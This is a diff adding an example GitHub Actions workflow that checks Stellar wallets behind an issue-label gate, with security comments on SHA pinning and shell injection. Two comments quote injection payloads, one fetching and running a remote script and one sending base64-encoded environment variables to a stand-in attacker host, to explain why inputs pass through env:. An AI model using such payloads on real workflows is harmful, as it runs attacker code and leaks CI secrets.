@@ -1,0 +1,118 @@
+# Example: TrustBridge with label gate
+#
+# This workflow demonstrates a simple label gate pattern. Wallet validation
+# only runs when the issue has a specific label (e.g., "bounty" or "needs-wallet").
+# When the gate is closed (no label present), validation is skipped entirely,
+# reducing noise and unnecessary API calls.
+#
+# Use case: Gate bounty payouts behind an explicit "bounty" label so not every
+# issue assignment triggers wallet checks.
+#
+# Copy this into `.github/workflows/trustbridge-label-gate.yml` in a consumer
+# repository and adjust `gate_labels` and `stellar_address_input` to match your
+# program.
+#
+# Permissions used: issues:read (for label checks), contents:read (optional, for config file)
+# No issues:write needed unless you set post_skip_comment: true.
+#
+# SECURITY NOTE ON THE `uses:` PIN BELOW:
+# This example pins trustbridge-label-gate to a specific released commit
+# SHA rather than @main. Consumer repos that copy this example inherit
+# whatever ref is pinned here — pointing at a floating branch would let any
+# future push to trustbridge-action's main branch silently change what
+# every consumer's CI runs. Bump the pin (and the version comment) here
+# only as part of a deliberate, reviewed release of this repo, the same
+# way you'd bump any other third-party action.
+#
+# TODO(maintainers): replace 07b97d28d482a18d277285f980dd5d7206673eb5 below with the commit SHA of the
+# release tag you want examples to track, e.g.:
+#   uses: Stellar-TrustBridge/trustbridge-action/.github/actions/trustbridge-label-gate@07b97d28d482a18d277285f980dd5d7206673eb5 # v1.4.0
+
+name: Verify Stellar wallet (with label gate)
+
+on:
+  issues:
+    types: [assigned]
+  workflow_dispatch:
+    inputs:
+      stellar_address:
+        description: 'Stellar G-address to validate'
+        required: true
+      gate_labels:
+        description: 'Comma-separated gate labels (e.g., bounty, needs-wallet)'
+        required: false
+        default: 'bounty'
+
+jobs:
+  trustbridge-gated:
+    runs-on: ubuntu-latest
+    permissions:
+      # Minimal permissions: read labels for the gate check, read repo for optional config file.
+      # No issues:write needed since post_skip_comment is false (default).
+      issues: read
+      contents: read
+    steps:
+      - name: Resolve Stellar address
+        id: addr
+        # workflow_dispatch inputs are passed through the environment
+        # rather than interpolated directly into the shell script. A raw
+        # ${{ github.event.inputs.stellar_address }} inside `run:` gets
+        # substituted before the shell ever sees it, so a value containing
+        # shell metacharacters (e.g. "$(curl evil.sh | sh)") would execute
+        # as code instead of being treated as a plain string. Routing it
+        # through `env:` keeps it as an inert string.
+        env:
+          INPUT_STELLAR_ADDRESS: ${{ github.event.inputs.stellar_address }}
+        run: |
+          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
+            echo "value=${INPUT_STELLAR_ADDRESS}" >> "$GITHUB_OUTPUT"
+          else
+            # Example: hardcoded address. In practice, extract from issue body or use assignee_address_map.
+            # See docs/USAGE.md for address extraction patterns.
+            echo "value=GYOURCONTRIBUTORADDRESSHERE" >> "$GITHUB_OUTPUT"
+          fi
+
+      - name: TrustBridge with label gate
+        id: gate
+        # Check out the repo if using a shared composite action from a branch
+        # (not required if using the repo's own .github/actions).
+        uses: Stellar-TrustBridge/trustbridge-action/.github/actions/trustbridge-label-gate@07b97d28d482a18d277285f980dd5d7206673eb5 # v1.4.0 — see note above
+        with:
+          github_token: ${{ secrets.GITHUB_TOKEN }}
+          stellar_address_input: ${{ steps.addr.outputs.value }}
+          gate_labels: ${{ github.event.inputs.gate_labels || 'bounty,needs-wallet' }}
+          post_skip_comment: 'false'  # don't post a comment when gate is closed
+          fail_on_missing: 'true'     # hard-fail when validation checks don't pass
+
+      - name: Log gate status
+        run: |
+          echo "Gate skipped: ${{ steps.gate.outputs.gate_skipped }}"
+          if [ "${{ steps.gate.outputs.gate_skipped }}" = "true" ]; then
+            echo "Validation was skipped (label gate closed)."
+          else
+            echo "Gate label found: ${{ steps.gate.outputs.gate_label_found }}"
+          fi
+
+      - name: Continue only if validated and funded
+        if: steps.gate.outputs.gate_skipped != 'true' && steps.gate.outputs.account_funded == 'true'
+        run: |
+          echo "✓ Account is funded and ready for payout."
+          echo "Trustline exists: ${{ steps.gate.outputs.trustline_exists }}"
+          echo "XLM balance: ${{ steps.gate.outputs.xlm_balance }}"
+
+      - name: Flag if validation failed
+        if: steps.gate.outputs.gate_skipped != 'true' && steps.gate.outputs.account_funded != 'true'
+        run: |
+          echo "✗ Account is not ready. See the comment on the issue for remediation steps."
+
+      - name: Alert if gate was skipped
+        if: steps.gate.outputs.gate_skipped == 'true'
+        # Double quotes don't stop $(...) command substitution or backticks
+        # in bash, so this workflow_dispatch input still needs to go
+        # through env: even though it's "just" being echoed — a value like
+        # $(curl attacker.example/$(env | base64)) would otherwise execute.
+        env:
+          GATE_LABELS: ${{ github.event.inputs.gate_labels || 'bounty,needs-wallet' }}
+        run: |
+          echo "ℹ️  Label gate was closed — wallet validation was skipped."
+          echo "   Add one of these labels to run validation: ${GATE_LABELS}"
